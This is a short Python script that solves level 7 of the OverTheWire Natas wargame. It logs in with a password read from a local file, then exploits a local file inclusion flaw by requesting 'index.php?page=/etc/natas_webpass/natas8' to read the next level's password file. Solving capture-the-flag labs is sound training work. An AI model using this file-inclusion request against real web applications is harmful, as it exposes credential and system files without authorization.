import requests

userName = 'natas7'
url = f'http://{userName}.natas.labs.overthewire.org/'
fileContent = open("C:\\Users\\niroj\\Documents\\Natas\\password.txt")
password = fileContent.readlines()[6][7:39]
# print(password)

response = requests.get( url, auth = (userName, password))
htmlDoc = response.text
# print(htmlDoc)

# the path was at the commented in source of html document
pathToPass = 'index.php?page=/etc/natas_webpass/natas8' 
response = requests.get( url + pathToPass, auth = (userName, password))
htmlDoc = response.text

# print(htmlDoc)

try:
    with open('C:\\Users\\niroj\\Documents\\Natas\\scripts\\temp\\index.html', 'w') as htmlContent:
        htmlContent.writelines(htmlDoc)
        print("Operation success!")
except IOError as e:
    print(f'An error has been appeared as {e}')

# after run this script you can get the password .\temp\index.html 